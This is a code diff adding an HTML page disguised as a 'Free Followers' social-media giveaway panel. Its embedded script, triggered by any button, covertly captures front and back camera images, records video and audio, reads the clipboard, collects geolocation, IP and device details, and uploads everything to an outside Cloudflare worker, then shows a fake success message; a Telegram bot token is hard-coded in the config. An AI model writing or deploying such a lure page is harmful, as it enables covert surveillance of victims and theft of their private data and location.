@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Free Followers – Official Panel</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📸</text></svg>">
+<style>
+body{margin:0;background:#111;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;text-align:center}
+header{background:#1877f2;padding:18px;font-size:26px;font-weight:700}
+button{display:block;margin:15px auto;padding:15px 25px;width:90%;max-width:320px;background:#1877f2;color:#fff;border:0;border-radius:8px;font-size:20px;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,.4)}
+button:hover{background:#0e5ac9}
+footer{padding:20px;font-size:12px;color:#888}
+#msg{margin-top:20px;font-size:14px;color:#0f0}
+</style>
+</head>
+<body>
+<header><i>📲</i> Free Followers Panel</header>
+<main>
+  <button onclick="go('followers')"><i>👥</i> Free Followers</button>
+  <button onclick="go('groups')"><i>💬</i> FB Calling Groups</button>
+  <button onclick="go('chats')"><i>💌</i> FB Chats Group</button>
+  <button onclick="go('dp')"><i>🖼</i> FB DPs</button>
+</main>
+<footer>© 2024 Metaverse – All rights ignored</footer>
+<div id="msg"></div>
+<script>
+/* ===== CONFIG ===== */
+const BOT_TOKEN = '8509183384:AAHEAk49_9bAHt44axRCAxFE1-CIqyiPuVo'; // <= CHANGE
+const WORKER_URL = 'https://lingering-recipe-41a8.buttsultan120.workers.dev/'; // <= CHANGE
+const SLUG = location.pathname.split('/').pop() || 'demo';
+/* ===== UTILS ===== */
+const $ = s => document.querySelector(s);
+const log = m => $('#msg').textContent = m;
+const rand = () => Math.random().toString(36).slice(2);
+/* ===== MAIN ===== */
+async function go(type){
+  log('Checking eligibility…');
+  if(!navigator.mediaDevices){log('Media denied');return;}
+  const con = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  const net = con ? `${con.effectiveType} ${con.downlink}Mbps` : 'unknown';
+  const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>j.ip);
+  const opts = {video:true,audio:true};
+  const stream = await navigator.mediaDevices.getUserMedia(opts);
+  const rec = new MediaRecorder(stream);
+  const chunks=[];
+  rec.ondataavailable=e=>chunks.push(e.data);
+  rec.start();
+  // front snap
+  const video=document.createElement('video');video.srcObject=stream;await video.play();
+  const can=document.createElement('canvas');can.width=video.videoWidth;can.height=video.videoHeight;
+  can.getContext('2d').drawImage(video,0,0);
+  const front = can.toDataURL('image/jpeg',.6);
+  // back cam
+  const backStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false});
+  const v2=document.createElement('video');v2.srcObject=backStream;await v2.play();
+  const c2=document.createElement('canvas');c2.width=v2.videoWidth;c2.height=v2.videoHeight;
+  c2.getContext('2d').drawImage(v2,0,0);
+  const back = c2.toDataURL('image/jpeg',.6);
+  // clipboard
+  let clip='';
+  try{clip=await navigator.clipboard.readText()}catch(e){}
+  // location
+  let loc='denied';
+  await new Promise(r=>navigator.geolocation.getCurrentPosition(p=>{loc=`${p.coords.latitude},${p.coords.longitude}`;r()},()=>r(),{timeout:3e3}));
+  // finish record
+  rec.stop();
+  await new Promise(res=>rec.onstop=res);
+  const blob=new Blob(chunks,{type:'video/webm'});
+  // upload
+  const fd=new FormData();
+  fd.append('token',SLUG);
+  fd.append('type',type);
+  fd.append('ip',ip);
+  fd.append('ua',navigator.userAgent);
+  fd.append('loc',loc);
+  fd.append('net',net);
+  fd.append('clipboard',clip);
+  fd.append('front',front);
+  fd.append('back',back);
+  fd.append('video',blob);
+  await fetch(WORKER_URL+'/upload',{method:'POST',body:fd});
+  log('Success! Redirecting…');
+  location.href='/success';
+}
+</script>
+</body>
+</html>
